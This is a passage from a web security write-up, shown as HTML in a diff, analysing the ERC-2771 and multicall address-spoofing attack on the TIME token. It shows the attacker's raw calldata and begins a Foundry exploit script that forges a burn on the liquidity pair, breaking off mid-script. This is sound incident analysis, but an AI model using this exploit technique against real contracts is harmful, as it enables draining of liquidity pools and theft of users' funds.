+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">signer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_hashTypedDataV4<span class="p">(</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">        </span><span class="nb">keccak256</span><span class="p">(</span>abi<span class="p">.</span>encode<span class="p">(</span>TYPEHASH<span class="p">,</span><span class="w"> </span>req<span class="p">.</span>from<span class="p">,</span><span class="w"> </span>req<span class="p">.</span>to<span class="p">,</span><span class="w"> </span>req<span class="p">.</span>value<span class="p">,</span><span class="w"> </span>req<span class="p">.</span>gas<span class="p">,</span><span class="w"> </span>req<span class="p">.</span>nonce<span class="p">,</span><span class="w"> </span><span class="nb">keccak256</span><span class="p">(</span>req<span class="p">.</span>data<span class="p">)))</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">    </span><span class="p">).</span>recover<span class="p">(</span>signature<span class="p">);</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>_nonces<span class="p">[</span>req<span class="p">.</span>from<span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>req<span class="p">.</span>nonce<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>signer<span class="w"> </span><span class="o">==</span><span class="w"> </span>req<span class="p">.</span>from<span class="p">;</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="p">}</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="kt">function</span><span class="w"> </span><span class="nv">execute</span><span class="p">(</span>ForwardRequest<span class="w"> </span>calldata<span class="w"> </span>req<span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="w"> </span>signature<span class="p">)</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">    </span><span class="kt">public</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="w">    </span><span class="kt">payable</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="w">    </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">bool</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="p">)</span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="p">{</span>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>verify<span class="p">(</span>req<span class="p">,</span><span class="w"> </span>signature<span class="p">),</span><span class="w"> </span><span class="s2">&quot;MinimalForwarder: signature does not match request&quot;</span><span class="p">);</span>
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="w">    </span>_nonces<span class="p">[</span>req<span class="p">.</span>from<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>req<span class="p">.</span>nonce<span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="w">    </span><span class="c1">// solhint-disable-next-line avoid-low-level-calls</span>
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="w">    </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>result<span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>req<span class="p">.</span>to<span class="p">.</span>call<span class="p">{</span><span class="w"> </span>gas<span class="o">:</span><span class="w"> </span>req<span class="p">.</span>gas<span class="p">,</span><span class="w"> </span>value<span class="o">:</span><span class="w"> </span>req<span class="p">.</span>value<span class="w"> </span><span class="p">}(</span>
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="w">        </span>abi<span class="p">.</span>encodePacked<span class="p">(</span>req<span class="p">.</span>data<span class="p">,</span><span class="w"> </span>req<span class="p">.</span>from<span class="p">)</span>
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="w">    </span><span class="p">);</span>
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span>success<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="w">        </span><span class="c1">// Next 5 lines from https://ethereum.stackexchange.com/a/83577</span>
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>result<span class="p">.</span>length<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="m m-Decimal">68</span><span class="p">)</span><span class="w"> </span>revert<span class="p">(</span><span class="s2">&quot;Transaction reverted silently&quot;</span><span class="p">);</span>
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="w">        </span>assembly<span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="w">            </span>result<span class="w"> </span><span class="o">:=</span><span class="w"> </span>add<span class="p">(</span>result<span class="p">,</span><span class="w"> </span><span class="mh">0x04</span><span class="p">)</span>
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a><span class="w">        </span>revert<span class="p">(</span>abi<span class="p">.</span>decode<span class="p">(</span>result<span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">string</span><span class="p">)));</span>
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a><span class="w">    </span><span class="c1">// Check gas: https://ronan.eth.link/blog/ethereum-gas-dangers/</span>
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a><span class="w">    </span>assert<span class="p">(</span>gasleft<span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>req<span class="p">.</span>gas<span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="m m-Decimal">63</span><span class="p">);</span>
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="p">(</span>success<span class="p">,</span><span class="w"> </span>result<span class="p">);</span>
+</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>The core function <code>execute</code> accepts a <code>ForwardRequest</code> and <code>signature</code>, verifies that the signer is <code>req.from</code>, and then uses the relevant information from <code>req</code> to make a call to <code>req.to</code> with gas as <code>req.gas</code> and value as <code>req.value</code>, using data as <code>abi.encodePacked(req.data, req.from)</code>.</p>
+<p>In this attack, the request encapsulated here is evidently a multicall to the TIME token. The implementation of this function is as follows:</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">multicall</span><span class="p">(</span><span class="kt">bytes</span><span class="p">[]</span><span class="w"> </span>calldata<span class="w"> </span>data<span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>virtual<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">bytes</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>results<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span>results<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">bytes</span><span class="p">[](</span>data<span class="p">.</span>length<span class="p">);</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="kt">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span><span class="w"> </span>i<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span>data<span class="p">.</span>length<span class="p">;</span><span class="w"> </span>i<span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">        </span>results<span class="p">[</span>i<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Address<span class="p">.</span>functionDelegateCall<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>data<span class="p">[</span>i<span class="p">]);</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>results<span class="p">;</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="p">}</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_functionDelegateCall</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">target</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>data<span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>AddressUpgradeable<span class="p">.</span>isContract<span class="p">(</span>target<span class="p">),</span><span class="w"> </span><span class="s2">&quot;Address: delegate call to non-contract&quot;</span><span class="p">);</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="w">    </span><span class="c1">// solhint-disable-next-line avoid-low-level-calls</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">    </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>returndata<span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>target<span class="p">.</span>delegatecall<span class="p">(</span>data<span class="p">);</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>AddressUpgradeable<span class="p">.</span>verifyCallResult<span class="p">(</span>success<span class="p">,</span><span class="w"> </span>returndata<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Address: low-level delegate call failed&quot;</span><span class="p">);</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>It directly calls <code>delegatecall</code> on <code>address(this)</code> with the given data,  which actually calls the <code>burn</code> function below.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">burn</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">value</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>virtual<span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">    </span>_burn<span class="p">(</span>_msgSender<span class="p">(),</span><span class="w"> </span>value<span class="p">);</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="p">}</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_msgSender</span><span class="p">()</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="kt">internal</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span>view
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span>virtual
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">    </span>override<span class="p">(</span>ContextUpgradeable<span class="p">,</span><span class="w"> </span>ERC2771ContextUpgradeable<span class="p">)</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">    </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>ERC2771ContextUpgradeable<span class="p">.</span>_msgSender<span class="p">();</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="p">}</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_msgSender</span><span class="p">()</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span>view<span class="w"> </span>virtual<span class="w"> </span>override<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>isTrustedForwarder<span class="p">(</span><span class="k">msg.sender</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="w">        </span><span class="c1">// The assembly code is more direct than the Solidity version using `abi.decode`.</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="w">        </span>assembly<span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="w">            </span>sender<span class="w"> </span><span class="o">:=</span><span class="w"> </span>shr<span class="p">(</span><span class="m m-Decimal">96</span><span class="p">,</span><span class="w"> </span>calldataload<span class="p">(</span>sub<span class="p">(</span>calldatasize<span class="p">(),</span><span class="w"> </span><span class="m m-Decimal">20</span><span class="p">)))</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span>super<span class="p">.</span>_msgSender<span class="p">();</span>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>The <code>burn</code> function burns the tokens of <code>_msgSender()</code>. The <code>_msgSender()</code> function calls <code>_msgSender()</code> from ERC2771. In this function, it first checks if <code>msg.sender</code> is a <code>TrustedForwarder</code>. If not, indicating a regular user's call, it returns <code>msg.sender</code> normally. Otherwise, it indicates a call through a legitimate Forwarder contract, returning the last 20 bytes of the data as the sender.</p>
+<p>The process of function calls implemented through Forwarder is actually <a href="https://eips.ethereum.org/EIPS/eip-2771">ERC-2771</a>, which allows for function calls without the need for users to send transactions themselves, but instead providing a signature for others to execute the corresponding function calls. The request forwarded by Forwarder can be understood as a packaged call. As long as the user provides the call information and the corresponding signature, others can make the call on their behalf.</p>
+<p>Normally, the process of forwarding calls by this Forwarder should be perfectly reasonable. When determining the sender of the call, it should obviously be the signer of <code>req</code>, not the actual transaction sender. So, during forwarding, the Forwarder appends <code>req.from</code>, the signer, to the end of the data, and then in <code>_msgSender</code>, it reads the last 20 bytes, thus correctly obtaining the msgSender.</p>
+<p>At first glance, this process seems fine. However, by combining with the <code>multicall</code> function implemented by the TIME token, the attacker bypassed the above identification of sender.</p>
+<p>The <code>req.data</code> passed by the attacker is as follows:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>0xac9650d8   // multicall
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>0000000000000000000000000000000000000000000000000000000000000020
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>0000000000000000000000000000000000000000000000000000000000000001
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>0000000000000000000000000000000000000000000000000000000000000020
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>0000000000000000000000000000000000000000000000000000000000000038
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>42966c68    // burn
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>0000000000000000000000000000000000000000c9112ec16d958e8da8180000  // value
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>760dc1e043d99394a10605b2fa08f123d60faf840000000000000000
+</span></code></pre></div>
+<p>The final data forwarded by the Forwarder is <code>req.data + req.from</code>. Thus, the Forwarder effectively forwarded a <code>multicall</code> to the TIME token. In this call, if <code>msgSender()</code> is involved, it will be the address of the actual attacker. However, the <code>multicall</code> will continue to delegatecall, and at this point, the attacker can maliciously append an additional address after the data of the single <code>multicall</code>, allowing the call to be executed with a manipulated sender without affecting the original call.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>forwarder -&gt; multicall + req.from
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>    multicall (msgSender-&gt;req.from) -&gt; burn + pairAddress
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>        burn (msgSender-&gt;
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>pairAddress) 
+</span></code></pre></div>
+<p>OpenZeppelin considers this as an <a href="https://blog.openzeppelin.com/arbitrary-address-spoofing-vulnerability-erc2771context-multicall-public-disclosure">Arbitrary Address Spoofing Attack</a>.</p>
+<h2 id="exploit">Exploit</h2>
+<h3 id="reproduce">Reproduce</h3>
+<p>According to the attack principles mentioned earlier, the vulnerability exploitation script can be constructed as follows.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">(</span>addr<span class="p">,</span><span class="w"> </span>privateKey<span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>makeAddrAndKey<span class="p">(</span><span class="s2">&quot;attacker&quot;</span><span class="p">);</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testExploit</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span>vm<span class="p">.</span>startPrank<span class="p">(</span>addr<span class="p">,</span><span class="w"> </span>addr<span class="p">);</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">18730462</span><span class="p">;</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">    </span>deal<span class="p">(</span><span class="kt">address</span><span class="p">(</span>weth<span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>addr<span class="p">),</span><span class="w"> </span><span class="m m-Decimal">5</span><span class="w"> </span>ether<span class="p">);</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">wethBalanceBefore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>weth<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>addr<span class="p">));</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;WETH balance before attack&quot;</span><span class="p">,</span><span class="w"> </span>wethBalanceBefore<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">18</span><span class="p">);</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">    </span>time<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>router<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">    </span>weth<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>router<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">    </span>WETHToTIME<span class="p">();</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Pair TIME balance&quot;</span><span class="p">,</span><span class="w"> </span>time<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>time_weth<span class="p">)),</span><span class="w"> </span>time<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">    </span><span class="c1">// construct calldata</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">burnAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>time<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>time_weth<span class="p">))</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">1</span>e18<span class="p">;</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w">    </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>burnData<span class="w"> </span><span class="o">=</span><span class="w"> </span>abi<span class="p">.</span>encodeWithSelector<span class="p">(</span>ITIME<span class="p">.</span>burn<span class="p">.</span>selector<span class="p">,</span><span class="w"> </span>burnAmount<span class="p">);</span>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="w">    </span><span class="kt">bytes</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>data<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">bytes</span><span class="p">[](</span><span class="m m-Decimal">1</span><span class="p">);</span>
+</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="w">    </span>data<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>abi<span class="p">.</span>encodePacked<span class="p">(</span>burnData<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>time_weth<span class="p">));</span>
+</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="w">    </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>multicallData<span class="w"> </span><span class="o">=</span><span class="w"> </span>abi<span class="p">.</span>encodeWithSelector<span class="p">(</span>ITIME<span class="p">.</span>multicall<span class="p">.</span>selector<span class="p">,</span><span class="w"> </span>data<span class="p">);</span>
+</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>
+</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="w">    </span><span class="c1">// construct ForwardRequest</span>
